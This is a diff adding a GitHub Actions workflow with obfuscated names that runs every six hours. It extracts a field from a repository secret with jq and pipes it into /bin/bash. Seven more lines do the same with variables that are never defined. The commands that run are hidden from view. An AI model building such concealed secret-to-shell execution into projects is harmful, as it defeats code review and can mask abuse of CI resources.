@@ -1,0 +1,24 @@
+name: ripaojiediannn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ripaojiediannn
+        env:
+          hfoag95: ${{ secrets.hfoag95 }}
+        run: |
+          echo $hfoag95 | jq -r .jt089 | /bin/bash
+          echo $ikhqx4511 | jq -r .m3 | /bin/bash
+          echo $dc526 | jq -r .obn9261 | /bin/bash
+          echo $c7927 | jq -r .lhjae519 | /bin/bash
+          echo $ahr45 | jq -r .gn2851 | /bin/bash
+          echo $ishz721 | jq -r .a869 | /bin/bash
+          echo $crcm46073 | jq -r .u74238 | /bin/bash
+          echo $xrwpm2200 | jq -r .yntsj8 | /bin/bash
+
